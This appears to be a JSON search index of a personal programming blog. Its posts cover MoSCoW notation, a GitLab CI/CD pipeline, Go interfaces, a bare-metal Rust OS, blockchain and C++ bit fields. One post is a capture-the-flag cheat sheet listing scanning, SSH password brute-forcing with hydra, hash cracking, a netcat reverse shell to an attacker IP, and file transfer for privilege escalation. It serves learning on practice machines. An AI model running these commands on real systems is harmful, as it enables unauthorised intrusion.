[{"content":"Motivation During the internship at Logitech, I refactor and optimize the internal test tool. When I finished the coding, my manager ask me to write a detailed document to record the core logic in this test tool.\nWhen I wrote the document, my manager ask me to use MOSCOW notation to list down the requirements of this test tool.\nBut, What is MOSCOW notation ? ðŸ¤”\nMeaning MoSCoW is an acronym derived from four letters of each prioritization : M for MUST HAVE, S for SHOULD HAVE, C for COULD HAVE and W for WON\u0026rsquo;T HAVE. It didn\u0026rsquo;t have O, just for word pronounceable.\nExample So when I write a test tool(prime detector) to detect prime number and composite number and we plan to detect floating point in the future, I will need to write the below requirement.\nPRIMEDETECTOR-1: MUST detect the prime number. PRIMEDETECTOR-2: MUST detect the composite number. PRIMEDETECTOR-3: SHOULD detect the floating point. ","permalink":"https://BWbwchen.github.io/posts/moscow_notation/","summary":"What is MOSCOW notation?","title":"Moscow_notation"},{"content":"Recently, I have been writting a tinyURL service with a CI/CD pipeline on self-hosted gitlab. I want to record this horrible and time-consuming self-taught journey.\nOur CI/CD pipeline will be composed with test, build and deploy. We first test the code, check whether there is any mistake in our code logic. Second, we build it to binary. Finally, we deploy our binary on the cloud or your own kubernetes.\nEnvironment  golang 1.16.5 docker 20.10.7 docker-compose 1.29.2 rancher 2.4.16 gitlab-runner with docker executor  tinyURL tinyURL was written for self-taught with backend developement, kubernetes, docker and DevOps. User will give the service a longURL. Service will give back the short name of that URL. Once user query the service with the short name, service will need to give back the original long URL. for more info, check this\nThis is the overview architecture: Test on Local Notice that the whole system comprises 4 main module: api server, redis service, mongodb service and Zookeeper service. So I choose docker-compose to build a testing environment. Let\u0026rsquo;s check the setting yaml file:\nversion: \u0026#34;3\u0026#34; services: server: container_name: myshorturl image: shorturl_test ports: - 8081:8081 environment: REDIS_URL: redis:6379 DB_URL: db:27017 ZOOKEEPER_URL: zookeeper:2181 PORT: 8081 depends_on: - redis - db - zookeeper redis: container_name: redis image: redis:alpine expose: - 6379 db: container_name: monogodb image: mongo:4.0.26-xenial expose: - 27017 zookeeper: container_name: zookeeper image: zookeeper:3.7.0 expose: - 2181 There are 3 things to notice:\n Firstly, Make sure the version number is 3, or it will fail in the testing pipeline. Secondly, if api server want to connect with other service, connect the service name directly. eg: How to connect db ? just \u0026lt;dbprotocol\u0026gt;://db, such like : postgresql://db Lastly, the difference between ports and expose.  Ports will expose the port number and also publish them to the host machine. Expose will expose the port between the containers, it will not publish the port to the host machine.    Then run with command (it will shutdown containers automatically, if api-server finished test):\n$ docker-compose up --abort-on-container-exit --exit-code-from server Test test-job: stage: test before_script: - apk add docker-compose - docker build -f Dockerfile-ci --tag shorturl_test . script: - docker-compose up --abort-on-container-exit --exit-code-from server Since we use gitlab-runner docker executor with docker:stable image as default image, it only provide docker command. You can check the official documentation. We need to install the docker-compose command for testing. use apk to install it. Then build a docker image for golang testing command.\n# Dockerfile-ciFROMgolang:1.16WORKDIR/appCOPY . .CMD [ \u0026#34;go\u0026#34;, \u0026#34;test\u0026#34;, \u0026#34;-v\u0026#34; Build build-job: image: name: gcr.io/kaniko-project/executor:debug entrypoint: [\u0026#34;\u0026#34;] stage: build script: - mkdir -p /kaniko/.docker - echo \u0026#34;{\\\u0026#34;auths\\\u0026#34;:{\\\u0026#34;$DOCKER_REGISTRY\\\u0026#34;:{\\\u0026#34;username\\\u0026#34;:\\\u0026#34;${DOCKER_REGISTRY_USER}\\\u0026#34;,\\\u0026#34;password\\\u0026#34;:\\\u0026#34;${DOCKER_REGISTRY_PASSWORD}\\\u0026#34;}}}\u0026#34; \u0026gt; /kaniko/.docker/config.json - /kaniko/executor --context $CI_PROJECT_DIR --dockerfile $CI_PROJECT_DIR/Dockerfile --destination $DOCKER_IMAGE We use pre-build image to handle this stage.\nDeploy Now, We will try to deploy our service on kubernetes. I use rancher for kubernetes.\nThere are some things need to sure.\n kubeconfig file. docker registry username, password  First, deploy a deployment on kubernetes. So we can automatically deploy the next job trigger.\ndeploy-job: stage: deploy image: dtzar/helm-kubectl before_script: - sed -ie \u0026#34;s/deploy-date-value/$(date)/g\u0026#34; kubernetes/deploy.yaml - mkdir -p /root/.kube/ \u0026amp;\u0026amp; touch /root/.kube/config - echo ${KUBERNETES_KUBE_CONFIG} | base64 -d \u0026gt; ${KUBECONFIG} script: - kubectl apply -f kubernetes/deploy.yaml I use deply-date-value as a trigger to trigger the deployment update.\nFinal The CI/CD pipeline should run successfully ! Hooray ! ðŸŽ‰\nIf you have other problem, feel free to ask me !\nYou can find me here ðŸ‘‰ tim.chenbw@gmail.com\n","permalink":"https://BWbwchen.github.io/posts/shorturlcicd/","summary":"CI/CD on gitlab-ci with kubernetes","title":"CI/CD on gitlab-ci"},{"content":"Let\u0026rsquo;s check this example :\ntype SQL struct { table SQL.table } We want CRUD (create, read, update, delete) operation. So you might write the code like this :\npackage main import \u0026#34;fmt\u0026#34; type SQL struct { table string } func (s SQL) Create () { fmt.Println(\u0026#34;Create\u0026#34;) } func (s SQL) Read () { fmt.Println(\u0026#34;Read\u0026#34;) } func (s SQL) Update (criteria string) { fmt.Println(\u0026#34;Update\u0026#34;, criteria) } func (s SQL) Delete (criteria string) { fmt.Println(\u0026#34;Delete\u0026#34;, criteria) } type ORM interface{ Create() Read() Update(string) Delete(string) } func main() { sqldb := SQL{\u0026#34;table\u0026#34;} var db ORM = sqldb db.Create() db.Read() db.Update(\u0026#34;record\u0026#34;) db.Delete(\u0026#34;table\u0026#34;) } But you can notice that what if the operations were more than that ? We will get bunch of SQL member method ! We want to write \u0026ldquo;Clean Code\u0026rdquo;. We should follow the \u0026ldquo;Single-responsibility principle\u0026rdquo;(SRP) to design a more readable code. Struct SQL has deal with too many things ! We can try to make Create as a single struct, Read as a single struct. So each struct just do exactly one things. Let\u0026rsquo;s try the concept of inheritance\nInheritance in Golang :\npackage main import \u0026#34;fmt\u0026#34; type SQL struct { table string } type CreateSql struct { SQL } func (c CreateSql) Operate () { fmt.Println(\u0026#34;Create\u0026#34;) } type ReadSql struct { SQL } func (s ReadSql) Operate () { fmt.Println(\u0026#34;Read\u0026#34;) } type UpdateSql struct { SQL } func (s UpdateSql) Operate (criteria string) { fmt.Println(\u0026#34;Update\u0026#34;, criteria) } type DeleteSql struct { SQL } func (s DeleteSql) Operate (criteria string) { fmt.Println(\u0026#34;Delete\u0026#34;, criteria) } type ReadOnlyORM interface{ Operate() } type SideEffectORM interface{ Operate(string) } func main() { dbCreate := CreateSql{SQL{\u0026#34;table\u0026#34;}} dbRead := ReadSql{SQL{\u0026#34;table\u0026#34;}} dbUpdate := UpdateSql{SQL{\u0026#34;table\u0026#34;}} dbDelete := DeleteSql{SQL{\u0026#34;table\u0026#34;}} var read_only_orm ReadOnlyORM read_only_orm = dbCreate read_only_orm.Operate() read_only_orm = dbRead read_only_orm.Operate() var side_effect_orm SideEffectORM side_effect_orm = dbUpdate side_effect_orm.Operate(\u0026#34;test\u0026#34;) side_effect_orm = dbDelete side_effect_orm.Operate(\u0026#34;table\u0026#34;) } Now we make each struct just do only one thing. If Update operation has Bug, we can just modified UpdateSql struct without affecting other method.\nBut it seems like bringing owls to Athens for such little program. Maybe it is a good method, when the code is larger, not just 60 lines.\n","permalink":"https://BWbwchen.github.io/posts/gooop/","summary":"CRUD with clean code by using Go embed struct","title":"Go interface for inheritance"},{"content":"We can think of struct as a wrapper of object. You can also check Golang spec (struct).\ntype TestStruct struct { Interger int String string Bool bool SomeWeirdInterface interface{} OtherStruct // we call it embedded field } type OtherStruct struct { Hello string } We use Interface to group a set of method. You can think it as a list that all structs that have implemented the required method. If you missing one of the method, you can not in that interface.\nYou can also check Golang spec (interface).\ntype Human struct { name string } type Student struct { Human job string } type Worker struct { Human job string salary int } func (h Human) Info() { fmt.Printf(\u0026#34;I am %s\\n\u0026#34;, h.name) } func (s Student) Info () { fmt.Printf(\u0026#34;I am %s. I am a %s.\\n\u0026#34;, s.name, s.job) } func (w Worker) Info () { fmt.Printf(\u0026#34;I am %s. I am a %s. I have %d salary\\n\u0026#34;, w.name, w.job, w.salary) } type Person interface { Info() } with main function :\nfunc main() { Tom := Student{Human{\u0026#34;Tom\u0026#34;}, \u0026#34;student\u0026#34;} Ben := Worker{Human{\u0026#34;Ben\u0026#34;}, \u0026#34;worker\u0026#34;, 1000} Susan := Human{\u0026#34;Susan\u0026#34;} Tom.Info() Ben.Info() Susan.Info() var i Person // Becaus Student and Worker and Human all have implemented Info method  i = Tom i.Info() i = Ben i.Info() i = Susan i.Info() } We can see that Student, Worker, Human all have implemented the Info method, so the variabe i with type person interface will work well.\nI am Tom. I am a student. I am Ben. I am a worker. I have 1000 salary I am Susan I am Tom. I am a student. I am Ben. I am a worker. I have 1000 salary I am Susan But what if I change the Human method to Hi() ?\ncannot use Susan (type Human) as type Person in assignment: Human does not implement Person (missing Info method) ","permalink":"https://BWbwchen.github.io/posts/gostructinterface/","summary":"Struct wrap things, Interface make a member-required function list","title":"Go Struct and Interface"},{"content":"Write an OS in Rust First, we need to make a bare metal executable.\nBare Metal executable in Rust In Rust, We need to turn off the std lib with #![no_std] . But This is leed to this :\nerror: `#[panic_handler]` function required, but not found  error: language item required, but not found: `eh_personality` error: aborting due to 2 previous errors error: could not compile `os` To learn more, run the command again with --verbose. #[panic_handler]  #[panic_handler] is used to define the behavior of panic! in #![no_std] applications. \u0026ndash; The Rustonomicon\n It define the function that compiler should invoke when panic occurs.\nJust add this for convenient :\n#![no_std] use core::panic::PanicInfo; #[panic_handler] fn panic(_info: \u0026amp;PanicInfo) -\u0026gt; ! { loop {} } language item and eh_personality  The compiler currently makes a few assumptions about symbols which are available in the executable to call. Normally these functions are provided by the standard library, but without it you must define your own. These symbols are called \u0026ldquo;language items\u0026rdquo;, and they each have an internal name, and then a signature that an implementation must conform to.\n There are 3 language item symbols :\n rust_eh_personality : for failure mechanisms. rust_begin_panic : for failure mechanisms to display message on the screen. eh_catch_typeinfo : I don\u0026rsquo;t understand\u0026hellip;  Unwind When panic occurs, how do we cleanup the stack frame and handle it ? Use eh_personality ! It define how to run the destructor when panic occurs.\nHere, We use abort on panic, we don\u0026rsquo;t need to generate the unwind information and thus reduce the binary size.\nAdd below in Cargo.toml\n[profile.dev] panic = \u0026#34;abort\u0026#34; [profile.release] panic = \u0026#34;abort\u0026#34; The stragedy of panic is abort.\n Build it again ! ERROR !! NO~~~\nerror: requires `start` lang_item start attribute Which function should be called first ? A typical Rust binary that links the standard library first start in crt0(C runtime zero), which sets up the environment for a C application. The C runtime then invoke the entry point of Rust, which marked by start lang_item.\nIn this project, we need our own entry point, we don\u0026rsquo;t want to use crt0.\n#[no_mangle] pub extern \u0026#34;C\u0026#34; fn _start() -\u0026gt; ! { loop {} }  Linker error Compiler default think that our binary is depend on C runtime, but since we use our entry point, compiler doesn\u0026rsquo;t know what to do.\nchange compile command to :\ncargo build --target thumbv7em-none-eabihf ","permalink":"https://BWbwchen.github.io/posts/os_in_rust/","summary":"write an os in rust","title":"Os_in_rust"},{"content":"Block Chain Basic Chain for one block we record its :\n Index (the i th block in this chain) Timestamp Data The hash value of previous block Hash value of this block  Block Chain Network  accept imcoming data, and build a block broadcast the chain to all network within a time interval  Mining Algorithm - Proof of Work(used by Bitcoin) Algorithm ask the miner to done some \u0026ldquo;work\u0026rdquo;, and competed with other miners who were also do the same \u0026ldquo;work\u0026rdquo;.\nWork \u0026ldquo;Work\u0026rdquo; is all about cryptography and hashing.\nOne-way cryptography One-way cryptography take an input and applied it with a function to produce an indecipherable output. If you input the same data, the output of the crypto algorithm should give you the same output(idempotency).\n\u0026ldquo;Work\u0026rdquo; : participants hashed many combination of letters and numbers to produce the specific number of leading 0's.\nCheck whether you find the answer is easy, just hash it. So the winner miner can earn the bitcoin by proving you done the \u0026ldquo;work\u0026rdquo;. \u0026mdash;Proof-of-Work\nOf course, we can change the requirement of the numbers of leading 0\u0026rsquo;s dynamically to make sure the work won\u0026rsquo;t too easy. \u0026mdash;adjusting the difficulty\nimplementation Use Timestamp and all data in block to calculate hash to finish the work.\nMining Algorithm - Proof of Stake Proof of Work will consume lots of energy, as the difficulty of mining grows the higher energy it waste.\nWhat is \u0026ldquo;stake\u0026rdquo; meaning ? You can think word \u0026ldquo;stake\u0026rdquo; as how much money you have. In this mining algorithm, we pick winner base on miner\u0026rsquo;s money, the more money you have the higher possibility that you been picked.\nP2P Block Chain this website\nProblem Mining is on server ? or client ? decentralization ? ","permalink":"https://BWbwchen.github.io/posts/block_chain/","summary":"block chain tutorial","title":"Block chain"},{"content":"Root me  nmap the ip address  nmap -sC -sV \u0026lt;ip_addr\u0026gt; nikto to find vulnerability  nikto -h \u0026lt;url\u0026gt; gobuster to brute-force directory  gobuster dir -u \u0026lt;url\u0026gt; -w \u0026lt;wordlist\u0026gt; brute-force the ssh password : hydra  hydra -l \u0026lt;user_name\u0026gt; -P \u0026lt;word_list\u0026gt; \u0026lt;protocol\u0026gt;://\u0026lt;ip_addr\u0026gt; john the ripper  john \u0026lt;encrypted\u0026gt; --wordlist=\u0026lt;word_list\u0026gt; (--format=\u0026lt;format\u0026gt;) reverse shell  nc \u0026lt;attacker_ip\u0026gt; \u0026lt;port\u0026gt; -e /bin/bash # target machine nc -lvp \u0026lt;port\u0026gt; # attacker machine reverse shell send file (ex: send linpeas.sh)  nc -l -p \u0026lt;port\u0026gt; \u0026gt; \u0026lt;file\u0026gt; \u0026lt; /dev/null # target machine cat \u0026lt;file\u0026gt; | nc \u0026lt;target_ip\u0026gt; \u0026lt;port\u0026gt; # attacker machine linpeas.sh to find privilege escalation   gtfobins is good  ","permalink":"https://BWbwchen.github.io/posts/ctf_rootme_process/","summary":"Root me process","title":"CTF rootme process"},{"content":"C++ bit field When I reading the source code of gameboy-emulator, I saw this weird code.\nunsigned unused : 4; unsigned c : 1; /* Carry flag */ unsigned h : 1; /* Half carry flag */ unsigned n : 1; /* Add/sub flag */ unsigned z : 1; /* Zero flag */ The meaning of : It specifies the length in bits of each field.\nHere is an example :\n","permalink":"https://BWbwchen.github.io/posts/note/bit_field/","summary":"C++ bit field usage","title":"C++ bit field"},{"content":"","permalink":"https://BWbwchen.github.io/search/","summary":"","title":"Search"},{"content":"","permalink":"https://BWbwchen.github.io/archives/","summary":"archives","title":"Archive"}]